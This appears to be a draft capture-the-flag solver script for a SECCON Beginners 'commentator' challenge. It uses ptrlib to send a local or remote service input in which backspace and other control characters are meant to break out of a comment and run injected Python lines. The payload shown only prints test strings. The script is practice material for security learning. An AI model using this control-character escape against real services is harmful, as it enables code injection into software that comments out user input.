#!/usr/bin/env python
import ptrlib as ptr
import time

io = ptr.Process("python ./test.py")
# io = ptr.Process("python ./commentator.py")
# io = ptr.Socket("localhost", 4444)
# io = ptr.Socket("commentator.beginners.seccon.games", 4444)

pl = ""
# pl += "print('hello')\v\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\x03\r\nprint('world')"
pl += "\b\b\bprint('hello')\nprint('world')"

io.sendline(pl)
io.sendline("__EOF__")
time.sleep(0.5)
# io.close()
# io.sh()

